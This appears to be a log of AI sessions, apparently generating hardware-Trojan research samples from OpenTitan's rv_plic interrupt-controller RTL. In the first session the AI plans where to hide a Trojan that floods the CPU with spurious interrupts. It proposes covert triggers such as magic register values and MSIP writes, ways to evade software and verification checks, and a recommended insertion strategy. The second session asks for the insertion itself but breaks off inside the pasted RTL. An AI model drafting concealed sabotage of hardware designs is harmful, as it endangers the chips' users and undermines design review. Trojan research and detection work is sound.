# AI Interaction Log

Model: claude-sonnet-4-20250514

---

## Interaction 1

**Timestamp:** 2025-12-02T16:24:06.631982

**System Prompt:**
```
You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.
```

**User Prompt:**
```

Analyze the following SystemVerilog/Verilog RTL code for the rv_plic module in OpenTitan SoC.

RTL CODE:
```systemverilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// RISC-V Platform-Level Interrupt Controller compliant INTC
//
//   Current version doesn't support MSI interrupt but it is easy to add
//   the feature. Create one external register and connect qe signal to the
//   gateway module (as edge-triggered)
//
//   Consider to set MAX_PRIO as small number as possible. It is main factor
//   of area increase if edge-triggered counter isn't implemented.
//
// Verilog parameter
//   MAX_PRIO: Maximum value of interrupt priority

`include "prim_assert.sv"

module rv_plic import rv_plic_reg_pkg::*; #(
  parameter logic [NumAlerts-1:0] AlertAsyncOn    = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles = 1,
  // OpenTitan IP standardizes on level triggered interrupts,
  // hence LevelEdgeTrig is set to all-zeroes by default.
  // Note that in case of edge-triggered interrupts, CDC handling is not
  // fully implemented yet (this would require instantiating pulse syncs
  // and routing the source clocks / resets to the PLIC).
  parameter logic [NumSrc-1:0]    LevelEdgeTrig = '0, // 0: level, 1: edge
  // derived parameter
  localparam int SRCW    = $clog2(NumSrc)
) (
  input     clk_i,
  input     rst_ni,

  // Bus Interface (device)
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Interrupt Sources
  input  [NumSrc-1:0] intr_src_i,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Interrupt notification to targets
  output [NumTarget-1:0] irq_o,
  output [SRCW-1:0]      irq_id_o [NumTarget],

  output logic [NumTarget-1:0] msip_o
);

  rv_plic_reg2hw_t reg2hw;
  rv_plic_hw2reg_t hw2reg;

  localparam int MAX_PRIO    = 3;
  localparam int PRIOW = $clog2(MAX_PRIO+1);

  logic [NumSrc-1:0] ip;

  logic [NumSrc-1:0] ie [NumTarget];

  logic [NumTarget-1:0] claim_re; // Target read indicator
  logic [SRCW-1:0]      claim_id [NumTarget];
  logic [NumSrc-1:0]    claim; // Converted from claim_re/claim_id

  logic [NumTarget-1:0] complete_we; // Target write indicator
  logic [SRCW-1:0]      complete_id [NumTarget];
  logic [NumSrc-1:0]    complete; // Converted from complete_re/complete_id

  logic [SRCW-1:0]      cc_id [NumTarget]; // Write ID

  logic [NumSrc-1:0][PRIOW-1:0] prio;

  logic [PRIOW-1:0] threshold [NumTarget];

  // Glue logic between rv_plic_reg_top and others
  assign cc_id = irq_id_o;

  always_comb begin
    claim = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (claim_re[i]) claim[claim_id[i]] = 1'b1;
    end
  end
  always_comb begin
    complete = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (complete_we[i]) complete[complete_id[i]] = 1'b1;
    end
  end

  //`ASSERT_PULSE(claimPulse, claim_re[i])
  //`ASSERT_PULSE(completePulse, complete_we[i])

  `ASSERT(onehot0Claim, $onehot0(claim_re))

  `ASSERT(onehot0Complete, $onehot0(complete_we))

  //////////////
  // Priority //
  //////////////
  assign prio[0] = reg2hw.prio[0].q;
  assign prio[1] = reg2hw.prio[1].q;
  assign prio[2] = reg2hw.prio[2].q;
  assign prio[3] = reg2hw.prio[3].q;
  assign prio[4] = reg2hw.prio[4].q;
  assign prio[5] = reg2hw.prio[5].q;
  assign prio[6] = reg2hw.prio[6].q;
  assign prio[7] = reg2hw.prio[7].q;
  assign prio[8] = reg2hw.prio[8].q;
  assign prio[9] = reg2hw.prio[9].q;
  assign prio[10] = reg2hw.prio[10].q;
  assign prio[11] = reg2hw.prio[11].q;
  assign prio[12] = reg2hw.prio[12].q;
  assign prio[13] = reg2hw.prio[13].q;
  assign prio[14] = reg2hw.prio[14].q;
  assign prio[15] = reg2hw.prio[15].q;
  assign prio[16] = reg2hw.prio[16].q;
  assign prio[17] = reg2hw.prio[17].q;
  assign prio[18] = reg2hw.prio[18].q;
  assign prio[19] = reg2hw.prio[19].q;
  assign prio[20] = reg2hw.prio[20].q;
  assign prio[21] = reg2hw.prio[21].q;
  assign prio[22] = reg2hw.prio[22].q;
  assign prio[23] = reg2hw.prio[23].q;
  assign prio[24] = reg2hw.prio[24].q;
  assign prio[25] = reg2hw.prio[25].q;
  assign prio[26] = reg2hw.prio[26].q;
  assign prio[27] = reg2hw.prio[27].q;
  assign prio[28] = reg2hw.prio[28].q;
  assign prio[29] = reg2hw.prio[29].q;
  assign prio[30] = reg2hw.prio[30].q;
  assign prio[31] = reg2hw.prio[31].q;
  assign prio[32] = reg2hw.prio[32].q;
  assign prio[33] = reg2hw.prio[33].q;
  assign prio[34] = reg2hw.prio[34].q;
  assign prio[35] = reg2hw.prio[35].q;
  assign prio[36] = reg2hw.prio[36].q;
  assign prio[37] = reg2hw.prio[37].q;
  assign prio[38] = reg2hw.prio[38].q;
  assign prio[39] = reg2hw.prio[39].q;
  assign prio[40] = reg2hw.prio[40].q;
  assign prio[41] = reg2hw.prio[41].q;
  assign prio[42] = reg2hw.prio[42].q;
  assign prio[43] = reg2hw.prio[43].q;
  assign prio[44] = reg2hw.prio[44].q;
  assign prio[45] = reg2hw.prio[45].q;
  assign prio[46] = reg2hw.prio[46].q;
  assign prio[47] = reg2hw.prio[47].q;
  assign prio[48] = reg2hw.prio[48].q;
  assign prio[49] = reg2hw.prio[49].q;
  assign prio[50] = reg2hw.prio[50].q;
  assign prio[51] = reg2hw.prio[51].q;
  assign prio[52] = reg2hw.prio[52].q;
  assign prio[53] = reg2hw.prio[53].q;
  assign prio[54] = reg2hw.prio[54].q;
  assign prio[55] = reg2hw.prio[55].q;
  assign prio[56] = reg2hw.prio[56].q;
  assign prio[57] = reg2hw.prio[57].q;
  assign prio[58] = reg2hw.prio[58].q;
  assign prio[59] = reg2hw.prio[59].q;
  assign prio[60] = reg2hw.prio[60].q;
  assign prio[61] = reg2hw.prio[61].q;
  assign prio[62] = reg2hw.prio[62].q;
  assign prio[63] = reg2hw.prio[63].q;
  assign prio[64] = reg2hw.prio[64].q;
  assign prio[65] = reg2hw.prio[65].q;
  assign prio[66] = reg2hw.prio[66].q;
  assign prio[67] = reg2hw.prio[67].q;
  assign prio[68] = reg2hw.prio[68].q;
  assign prio[69] = reg2hw.prio[69].q;
  assign prio[70] = reg2hw.prio[70].q;
  assign prio[71] = reg2hw.prio[71].q;
  assign prio[72] = reg2hw.prio[72].q;
  assign prio[73] = reg2hw.prio[73].q;
  assign prio[74] = reg2hw.prio[74].q;
  assign prio[75] = reg2hw.prio[75].q;
  assign prio[76] = reg2hw.prio[76].q;
  assign prio[77] = reg2hw.prio[77].q;
  assign prio[78] = reg2hw.prio[78].q;
  assign prio[79] = reg2hw.prio[79].q;
  assign prio[80] = reg2hw.prio[80].q;
  assign prio[81] = reg2hw.prio[81].q;
  assign prio[82] = reg2hw.prio[82].q;
  assign prio[83] = reg2hw.prio[83].q;
  assign prio[84] = reg2hw.prio[84].q;
  assign prio[85] = reg2hw.prio[85].q;
  assign prio[86] = reg2hw.prio[86].q;
  assign prio[87] = reg2hw.prio[87].q;
  assign prio[88] = reg2hw.prio[88].q;
  assign prio[89] = reg2hw.prio[89].q;
  assign prio[90] = reg2hw.prio[90].q;
  assign prio[91] = reg2hw.prio[91].q;
  assign prio[92] = reg2hw.prio[92].q;
  assign prio[93] = reg2hw.prio[93].q;
  assign prio[94] = reg2hw.prio[94].q;
  assign prio[95] = reg2hw.prio[95].q;
  assign prio[96] = reg2hw.prio[96].q;
  assign prio[97] = reg2hw.prio[97].q;
  assign prio[98] = reg2hw.prio[98].q;
  assign prio[99] = reg2hw.prio[99].q;
  assign prio[100] = reg2hw.prio[100].q;
  assign prio[101] = reg2hw.prio[101].q;
  assign prio[102] = reg2hw.prio[102].q;
  assign prio[103] = reg2hw.prio[103].q;
  assign prio[104] = reg2hw.prio[104].q;
  assign prio[105] = reg2hw.prio[105].q;
  assign prio[106] = reg2hw.prio[106].q;
  assign prio[107] = reg2hw.prio[107].q;
  assign prio[108] = reg2hw.prio[108].q;
  assign prio[109] = reg2hw.prio[109].q;
  assign prio[110] = reg2hw.prio[110].q;
  assign prio[111] = reg2hw.prio[111].q;
  assign prio[112] = reg2hw.prio[112].q;
  assign prio[113] = reg2hw.prio[113].q;
  assign prio[114] = reg2hw.prio[114].q;
  assign prio[115] = reg2hw.prio[115].q;
  assign prio[116] = reg2hw.prio[116].q;
  assign prio[117] = reg2hw.prio[117].q;
  assign prio[118] = reg2hw.prio[118].q;
  assign prio[119] = reg2hw.prio[119].q;
  assign prio[120] = reg2hw.prio[120].q;
  assign prio[121] = reg2hw.prio[121].q;
  assign prio[122] = reg2hw.prio[122].q;
  assign prio[123] = reg2hw.prio[123].q;
  assign prio[124] = reg2hw.prio[124].q;
  assign prio[125] = reg2hw.prio[125].q;
  assign prio[126] = reg2hw.prio[126].q;
  assign prio[127] = reg2hw.prio[127].q;
  assign prio[128] = reg2hw.prio[128].q;
  assign prio[129] = reg2hw.prio[129].q;
  assign prio[130] = reg2hw.prio[130].q;
  assign prio[131] = reg2hw.prio[131].q;
  assign prio[132] = reg2hw.prio[132].q;
  assign prio[133] = reg2hw.prio[133].q;
  assign prio[134] = reg2hw.prio[134].q;
  assign prio[135] = reg2hw.prio[135].q;
  assign prio[136] = reg2hw.prio[136].q;
  assign prio[137] = reg2hw.prio[137].q;
  assign prio[138] = reg2hw.prio[138].q;
  assign prio[139] = reg2hw.prio[139].q;
  assign prio[140] = reg2hw.prio[140].q;
  assign prio[141] = reg2hw.prio[141].q;
  assign prio[142] = reg2hw.prio[142].q;
  assign prio[143] = reg2hw.prio[143].q;
  assign prio[144] = reg2hw.prio[144].q;
  assign prio[145] = reg2hw.prio[145].q;
  assign prio[146] = reg2hw.prio[146].q;
  assign prio[147] = reg2hw.prio[147].q;
  assign prio[148] = reg2hw.prio[148].q;
  assign prio[149] = reg2hw.prio[149].q;
  assign prio[150] = reg2hw.prio[150].q;
  assign prio[151] = reg2hw.prio[151].q;
  assign prio[152] = reg2hw.prio[152].q;
  assign prio[153] = reg2hw.prio[153].q;
  assign prio[154] = reg2hw.prio[154].q;
  assign prio[155] = reg2hw.prio[155].q;
  assign prio[156] = reg2hw.prio[156].q;
  assign prio[157] = reg2hw.prio[157].q;
  assign prio[158] = reg2hw.prio[158].q;
  assign prio[159] = reg2hw.prio[159].q;
  assign prio[160] = reg2hw.prio[160].q;
  assign prio[161] = reg2hw.prio[161].q;
  assign prio[162] = reg2hw.prio[162].q;
  assign prio[163] = reg2hw.prio[163].q;
  assign prio[164] = reg2hw.prio[164].q;
  assign prio[165] = reg2hw.prio[165].q;
  assign prio[166] = reg2hw.prio[166].q;
  assign prio[167] = reg2hw.prio[167].q;
  assign prio[168] = reg2hw.prio[168].q;
  assign prio[169] = reg2hw.prio[169].q;
  assign prio[170] = reg2hw.prio[170].q;
  assign prio[171] = reg2hw.prio[171].q;
  assign prio[172] = reg2hw.prio[172].q;
  assign prio[173] = reg2hw.prio[173].q;
  assign prio[174] = reg2hw.prio[174].q;
  assign prio[175] = reg2hw.prio[175].q;
  assign prio[176] = reg2hw.prio[176].q;
  assign prio[177] = reg2hw.prio[177].q;
  assign prio[178] = reg2hw.prio[178].q;
  assign prio[179] = reg2hw.prio[179].q;
  assign prio[180] = reg2hw.prio[180].q;
  assign prio[181] = reg2hw.prio[181].q;
  assign prio[182] = reg2hw.prio[182].q;
  assign prio[183] = reg2hw.prio[183].q;
  assign prio[184] = reg2hw.prio[184].q;
  assign prio[185] = reg2hw.prio[185].q;

  //////////////////////
  // Interrupt Enable //
  //////////////////////
  for (genvar s = 0; s < 186; s++) begin : gen_ie0
    assign ie[0][s] = reg2hw.ie0[s].q;
  end

  ////////////////////////
  // THRESHOLD register //
  ////////////////////////
  assign threshold[0] = reg2hw.threshold0.q;

  /////////////////
  // CC register //
  /////////////////
  assign claim_re[0]    = reg2hw.cc0.re;
  assign claim_id[0]    = irq_id_o[0];
  assign complete_we[0] = reg2hw.cc0.qe;
  assign complete_id[0] = reg2hw.cc0.q;
  assign hw2reg.cc0.d   = cc_id[0];

  ///////////////////
  // MSIP register //
  ///////////////////
  assign msip_o[0] = reg2hw.msip0.q;

  ////////
  // IP //
  ////////
  for (genvar s = 0; s < 186; s++) begin : gen_ip
    assign hw2reg.ip[s].de = 1'b1; // Always write
    assign hw2reg.ip[s].d  = ip[s];
  end

  //////////////
  // Gateways //
  //////////////

  // Synchronize all incoming interrupt requests.
  logic [NumSrc-1:0] intr_src_synced;
  prim_flop_2sync #(
    .Width(NumSrc)
  ) u_prim_flop_2sync (
    .clk_i,
    .rst_ni,
    .d_i(intr_src_i),
    .q_o(intr_src_synced)
  );

  rv_plic_gateway #(
    .N_SOURCE   (NumSrc)
  ) u_gateway (
    .clk_i,
    .rst_ni,

    .src_i      (intr_src_synced),
    .le_i       (LevelEdgeTrig),

    .claim_i    (claim),
    .complete_i (complete),

    .ip_o       (ip)
  );

  ///////////////////////////////////
  // Target interrupt notification //
  ///////////////////////////////////
  for (genvar i = 0 ; i < NumTarget ; i++) begin : gen_target
    rv_plic_target #(
      .N_SOURCE    (NumSrc),
      .MAX_PRIO    (MAX_PRIO)
    ) u_target (
      .clk_i,
      .rst_ni,

      .ip_i        (ip),
      .ie_i        (ie[i]),

      .prio_i      (prio),
      .threshold_i (threshold[i]),

      .irq_o       (irq_o[i]),
      .irq_id_o    (irq_id_o[i])

    );
  end

  ////////////
  // Alerts //
  ////////////

  logic [NumAlerts-1:0] alert_test, alerts;

  assign alert_test = {
    reg2hw.alert_test.q &
    reg2hw.alert_test.qe
  };

  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i  ( alert_test[i] ),
      .alert_req_i   ( alerts[i]     ),
      .alert_ack_o   (               ),
      .alert_state_o (               ),
      .alert_rx_i    ( alert_rx_i[i] ),
      .alert_tx_o    ( alert_tx_o[i] )
    );
  end

  ////////////////////////
  // Register interface //
  ////////////////////////
  //  Limitation of register tool prevents the module from having flexibility to parameters
  //  So, signals are manually tied at the top.
  rv_plic_reg_top u_reg (
    .clk_i,
    .rst_ni,

    .tl_i,
    .tl_o,

    .reg2hw,
    .hw2reg,

    // SEC_CM: BUS.INTEGRITY
    .intg_err_o(alerts[0])
  );

  // Assertions
  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)
  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)
  `ASSERT_KNOWN(IrqKnownO_A, irq_o)
  `ASSERT_KNOWN(MsipKnownO_A, msip_o)
  for (genvar k = 0; k < NumTarget; k++) begin : gen_irq_id_known
    `ASSERT_KNOWN(IrqIdKnownO_A, irq_id_o[k])
  end

  // Assume
  `ASSUME(Irq0Tied_A, intr_src_i[0] == 1'b0)

  // This assertion should be provable in FPV because we don't have a block-level DV environment. It
  // is trying to say that any integrity error detected inside the register block (u_reg) will cause
  // an alert to be asserted within at most _SEC_CM_ALERT_MAX_CYC cycles.
  //
  // This isn't *quite* true because there are two extra requirements for prim_alert_sender to send
  // an alert with alert_p high:
  //
  //  - The multi-phase alert handshake might not be in the expected phase. Rather than adding an
  //    assumption that says alert_rx_i acks a signal when it is raised, we cheat and add a
  //    precondition about the initial state of the prim_alert_sender FSM, guaranteeing that we're
  //    not waiting for an ack.
  //
  //  - The prim_alert_sender musn't detect a signal integrity issue on the alert signal coming in
  //    (alert_rx_i). Normally FpvSecCm tests get analysed with an FPV_ALERT_NO_SIGINT_ERR define,
  //    but we don't have that defined here. To avoid this happening, we want an assertion of the
  //    form "If no integrity error is detected for _SEC_CM_ALERT_MAX_CYC cycles, the alert_p signal
  //    must go high". To encode this cleanly in SVA, we actually say "We can't have neither an
  //    integrity error nor an alert signal for too many cycles".
  `ASSERT(FpvSecCmBusIntegrity_A,
          ($rose(u_reg.intg_err) &&
           gen_alert_tx[0].u_prim_alert_sender.state_q == gen_alert_tx[0].u_prim_alert_sender.Idle)
          |->
          not ((!gen_alert_tx[0].u_prim_alert_sender.sigint_detected && !alert_tx_o[0].alert_p)
               [*`_SEC_CM_ALERT_MAX_CYC]))

  // Alert assertions for reg_we onehot check
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT_IN(RegWeOnehotCheck_A,
                                                    u_reg,
                                                    gen_alert_tx[0].u_prim_alert_sender.alert_req_i)
endmodule

```

Task: Identify potential locations for inserting a hardware Trojan with the following characteristics:
Floods CPU with spurious interrupts

Please provide:
1. A list of 3-5 potential insertion points (specify signal names, always blocks, or state machine locations)
2. For each insertion point, explain:
   - Why this location is suitable
   - What signals are accessible at this point
   - How a Trojan could be triggered without affecting normal operation
   - The potential impact of a Trojan at this location

3. Recommend the BEST insertion point and justify your choice

Format your response clearly with sections for each insertion point.

```

**Claude Response:**
```
I'll analyze the rv_plic module to identify potential hardware Trojan insertion points that could flood the CPU with spurious interrupts.

## Potential Insertion Points

### 1. Interrupt Source Synchronization (intr_src_synced)

**Location:** After the `prim_flop_2sync` module output
```systemverilog
logic [NumSrc-1:0] intr_src_synced;
prim_flop_2sync #(
  .Width(NumSrc)
) u_prim_flop_2sync (
  .clk_i,
  .rst_ni,
  .d_i(intr_src_i),
  .q_o(intr_src_synced)  // <-- INSERTION POINT
);
```

**Why suitable:**
- Direct access to all synchronized interrupt sources before gateway processing
- Can inject false interrupt signals without modifying external interrupt sources
- The synchronization stage masks the origin of spurious signals

**Accessible signals:**
- `intr_src_synced[NumSrc-1:0]` - synchronized interrupt sources
- `clk_i`, `rst_ni` - timing and reset signals
- All register interface signals for triggering conditions

**Trojan trigger mechanism:**
- Monitor specific register writes (e.g., writing magic values to unused priority registers)
- Time-based triggers using clock counters
- Specific interrupt pattern detection

**Potential impact:**
- Can generate spurious interrupts on any or all interrupt sources
- Bypasses external interrupt source validation
- Difficult to trace back to original source

### 2. Gateway Module IP Output (ip signal)

**Location:** Between gateway output and target modules
```systemverilog
rv_plic_gateway #(
  .N_SOURCE   (NumSrc)
) u_gateway (
  // ...
  .ip_o       (ip)  // <-- INSERTION POINT
);
```

**Why suitable:**
- Controls the interrupt pending status sent to all targets
- Can manipulate interrupt state after gateway processing
- Affects all targets simultaneously

**Accessible signals:**
- `ip[NumSrc-1:0]` - interrupt pending status
- `claim`, `complete` - interrupt handling status
- `LevelEdgeTrig` - interrupt trigger configuration

**Trojan trigger mechanism:**
- Monitor claim/complete patterns to detect CPU activity
- Trigger during specific system states (low claim activity = idle CPU)
- Use threshold register values as trigger conditions

**Potential impact:**
- Creates persistent spurious interrupt pending states
- Can overwhelm interrupt handling by making interrupts appear constantly pending
- Affects interrupt priority resolution

### 3. Target Module IRQ Output Manipulation

**Location:** After target module processing, before final output
```systemverilog
for (genvar i = 0 ; i < NumTarget ; i++) begin : gen_target
  rv_plic_target #(
    .N_SOURCE    (NumSrc),
    .MAX_PRIO    (MAX_PRIO)
  ) u_target (
    // ...
    .irq_o       (irq_o[i]),     // <-- INSERTION POINT
    .irq_id_o    (irq_id_o[i])   // <-- INSERTION POINT
  );
end
```

**Why suitable:**
- Direct control over CPU interrupt notification
- Can inject interrupts with arbitrary IDs
- Bypasses all priority and enable checking

**Accessible signals:**
- `irq_o[NumTarget-1:0]` - final interrupt outputs to CPU
- `irq_id_o[NumTarget][SRCW-1:0]` - interrupt source IDs
- `threshold[NumTarget]`, `ie[NumTarget]` - per-target configuration

**Trojan trigger mechanism:**
- Monitor CPU interrupt servicing patterns via claim_re signals
- Activate during specific priority threshold values
- Use MSIP register as covert trigger channel

**Potential impact:**
- Direct CPU interrupt flooding
- Can provide false interrupt IDs leading to incorrect ISR execution
- Complete bypass of PLIC interrupt management

### 4. Register Interface hw2reg Manipulation

**Location:** Hardware-to-register interface signals
```systemverilog
// IP register updates
for (genvar s = 0; s < 186; s++) begin : gen_ip
  assign hw2reg.ip[s].de = 1'b1; // Always write
  assign hw2reg.ip[s].d  = ip[s];  // <-- INSERTION POINT
end
```

**Why suitable:**
- Can manipulate interrupt pending register values visible to software
- Creates inconsistency between hardware state and software view
- Difficult for software to detect discrepancies

**Accessible signals:**
- `hw2reg.ip[185:0]` - interrupt pending register updates
- `hw2reg.cc0.d` - claim/complete register value
- All reg2hw signals for trigger detection

**Trojan trigger mechanism:**
- Monitor specific register access patterns
- Activate on writes to alert_test register
- Use priority register values as trigger encoding

**Potential impact:**
- Software sees persistent interrupt pending status
- Can cause software to continuously service non-existent interrupts
- Creates system instability through software-hardware state mismatch

### 5. Priority Register Manipulation

**Location:** Priority value assignments to internal prio array
```systemverilog
assign prio[0] = reg2hw.prio[0].q;   // <-- INSERTION POINT
assign prio[1] = reg2hw.prio[1].q;   // <-- INSERTION POINT
// ... (similar for all 186 priority registers)
```

**Why suitable:**
- Can manipulate interrupt priorities to elevate spurious interrupts
- Many unused priority registers available as covert channels
- Priority manipulation affects interrupt arbitration

**Accessible signals:**
- `reg2hw.prio[185:0].q` - priority register values
- `prio[NumSrc-1:0][PRIOW-1:0]` - internal priority array
- Threshold values for comparison

**Trojan trigger mechanism:**
- Use specific unused priority register values as trigger keys
- Combine multiple priority register values for complex triggers
- Time-delayed activation based on priority register write patterns

**Potential impact:**
- Can elevate low-priority spurious interrupts to highest priority
- Disrupts intended interrupt priority ordering
- Can mask legitimate high-priority interrupts

## Recommended Best Insertion Point

**BEST CHOICE: Target Module IRQ Output Manipulation (#3)**

### Justification:

1. **Maximum Impact**: Direct control over CPU interrupt lines provides the most effective way to flood the CPU with spurious interrupts.

2. **Complete Bypass**: Circumvents all PLIC protection mechanisms including:
   - Priority checking
   - Interrupt enable masks  
   - Threshold filtering
   - Gateway processing

3. **Stealth Operation**: 
   - Can be triggered by legitimate register operations
   - Maintains normal PLIC register states while injecting spurious outputs
   - Difficult to detect through software register inspection

4. **Flexible Triggering**:
   - Can monitor MSIP register for covert activation
   - Can use threshold register values as trigger keys
   - Can activate during specific interrupt servicing patterns

5. **Controllable Severity**:
   - Can generate sporadic interrupts to avoid immediate detection
   - Can escalate to complete CPU flooding when desired
   - Can target specific CPU cores in multi-core systems

**Implementation Strategy**: Insert logic that monitors the MSIP register or specific priority register values as triggers, then occasionally asserts `irq_o` with random or sequential `irq_id_o` values, creating spurious interrupts that bypass all PLIC filtering mechanisms.
```

**Token Usage:** Input: 7130, Output: 1828

---

## Interaction 2

**Timestamp:** 2025-12-02T16:26:01.505880

**System Prompt:**
```
You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.
```

**User Prompt:**
```

Insert a hardware Trojan into the following SystemVerilog/Verilog module.

ORIGINAL RTL:
```systemverilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// RISC-V Platform-Level Interrupt Controller compliant INTC
//
//   Current version doesn't support MSI interrupt but it is easy to add
//   the feature. Create one external register and connect qe signal to the
//   gateway module (as edge-triggered)
//
//   Consider to set MAX_PRIO as small number as possible. It is main factor
//   of area increase if edge-triggered counter isn't implemented.
//
// Verilog parameter
//   MAX_PRIO: Maximum value of interrupt priority

`include "prim_assert.sv"

module rv_plic import rv_plic_reg_pkg::*; #(
  parameter logic [NumAlerts-1:0] AlertAsyncOn    = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles = 1,
  // OpenTitan IP standardizes on level triggered interrupts,
  // hence LevelEdgeTrig is set to all-zeroes by default.
  // Note that in case of edge-triggered interrupts, CDC handling is not
  // fully implemented yet (this would require instantiating pulse syncs
  // and routing the source clocks / resets to the PLIC).
  parameter logic [NumSrc-1:0]    LevelEdgeTrig = '0, // 0: level, 1: edge
  // derived parameter
  localparam int SRCW    = $clog2(NumSrc)
) (
  input     clk_i,
  input     rst_ni,

  // Bus Interface (device)
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Interrupt Sources
  input  [NumSrc-1:0] intr_src_i,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Interrupt notification to targets
  output [NumTarget-1:0] irq_o,
  output [SRCW-1:0]      irq_id_o [NumTarget],

  output logic [NumTarget-1:0] msip_o
);

  rv_plic_reg2hw_t reg2hw;
  rv_plic_hw2reg_t hw2reg;

  localparam int MAX_PRIO    = 3;
  localparam int PRIOW = $clog2(MAX_PRIO+1);

  logic [NumSrc-1:0] ip;

  logic [NumSrc-1:0] ie [NumTarget];

  logic [NumTarget-1:0] claim_re; // Target read indicator
  logic [SRCW-1:0]      claim_id [NumTarget];
  logic [NumSrc-1:0]    claim; // Converted from claim_re/claim_id

  logic [NumTarget-1:0] complete_we; // Target write indicator
  logic [SRCW-1:0]      complete_id [NumTarget];
  logic [NumSrc-1:0]    complete; // Converted from complete_re/complete_id

  logic [SRCW-1:0]      cc_id [NumTarget]; // Write ID

  logic [NumSrc-1:0][PRIOW-1:0] prio;

  logic [PRIOW-1:0] threshold [NumTarget];

  // Glue logic between rv_plic_reg_top and others
  assign cc_id = irq_id_o;

  always_comb begin
    claim = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (claim_re[i]) claim[claim_id[i]] = 1'b1;
    end
  end
  always_comb begin
    complete = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (complete_we[i]) complete[complete_id[i]] = 1'b1;
    end
  end

  //`ASSERT_PULSE(claimPulse, claim_re[i])
  //`ASSERT_PULSE(completePulse, complete_we[i])

  `ASSERT(onehot0Claim, $onehot0(claim_re))

  `ASSERT(onehot0Complete, $onehot0(complete_we))

  //////////////
  // Priority //
  //////////////
  assign prio[0] = reg2hw.prio[0].q;
  assign prio[1] = reg2hw.prio[1].q;
  assign prio[2] = reg2hw.prio[2].q;
  assign prio[3] = reg2hw.prio[3].q;
  assign prio[4] = reg2hw.prio[4].q;
  assign prio[5] = reg2hw.prio[5].q;
  assign prio[6] = reg2hw.prio[6].q;
  assign prio[7] = reg2hw.prio[7].q;
  assign prio[8] = reg2hw.prio[8].q;
  assign prio[9] = reg2hw.prio[9].q;
  assign prio[10] = reg2hw.prio[10].q;
  assign prio[11] = reg2hw.prio[11].q;
  assign prio[12] = reg2hw.prio[12].q;
  assign prio[13] = reg2hw.prio[13].q;
  assign prio[14] = reg2hw.prio[14].q;
  assign prio[15] = reg2hw.prio[15].q;
  assign prio[16] = reg2hw.prio[16].q;
  assign prio[17] = reg2hw.prio[17].q;
  assign prio[18] = reg2hw.prio[18].q;
  assign prio[19] = reg2hw.prio[19].q;
  assign prio[20] = reg2hw.prio[20].q;
  assign prio[21] = reg2hw.prio[21].q;
  assign prio[22] = reg2hw.prio[22].q;
  assign prio[23] = reg2hw.prio[23].q;
  assign prio[24] = reg2hw.prio[24].q;
  assign prio[25] = reg2hw.prio[25].q;
  assign prio[26] = reg2hw.prio[26].q;
  assign prio[27] = reg2hw.prio[27].q;
  assign prio[28] = reg2hw.prio[28].q;
  assign prio[29] = reg2hw.prio[29].q;
  assign prio[30] = reg2hw.prio[30].q;
  assign prio[31] = reg2hw.prio[31].q;
  assign prio[32] = reg2hw.prio[32].q;
  assign prio[33] = reg2hw.prio[33].q;
  assign prio[34] = reg2hw.prio[34].q;
  assign prio[35] = reg2hw.prio[35].q;
  assign prio[36] = reg2hw.prio[36].q;
  assign prio[37] = reg2hw.prio[37].q;
  assign prio[38] = reg2hw.prio[38].q;
  assign prio[39] = reg2hw.prio[39].q;
  assign prio[40] = reg2hw.prio[40].q;
  assign prio[41] = reg2hw.prio[41].q;
  assign prio[42] = reg2hw.prio[42].q;
  assign prio[43] = reg2hw.prio[43].q;
  assign prio[44] = reg2hw.prio[44].q;
  assign prio[45] = reg2hw.prio[45].q;
  assign prio[46] = reg2hw.prio[46].q;
  assign prio[47] = reg2hw.prio[47].q;
  assign prio[48] = reg2hw.prio[48].q;
  assign prio[49] = reg2hw.prio[49].q;
  assign prio[50] = reg2hw.prio[50].q;
  assign prio[51] = reg2hw.prio[51].q;
  assign prio[52] = reg2hw.prio[52].q;
  assign prio[53] = reg2hw.prio[53].q;
  assign prio[54] = reg2hw.prio[54].q;
  assign prio[55] = reg2hw.prio[55].q;
  assign prio[56] = reg2hw.prio[56].q;
  assign prio[57] = reg2hw.prio[57].q;
  assign prio[58] = reg2hw.prio[58].q;
  assign prio[59] = reg2hw.prio[59].q;
  assign prio[60] = reg2hw.prio[60].q;
  assign prio[61] = reg2hw.prio[61].q;
  assign prio[62] = reg2hw.prio[62].q;
  assign prio[63] = reg2hw.prio[63].q;
  assign prio[64] = reg2hw.prio[64].q;
  assign prio[65] = reg2hw.prio[65].q;
  assign prio[66] = reg2hw.prio[66].q;
  assign prio[67] = reg2hw.prio[67].q;
  assign prio[68] = reg2hw.prio[68].q;
  assign prio[69] = reg2hw.prio[69].q;
  assign prio[70] = reg2hw.prio[70].q;
  assign prio[71] = reg2hw.prio[71].q;
  assign prio[72] = reg2hw.prio[72].q;
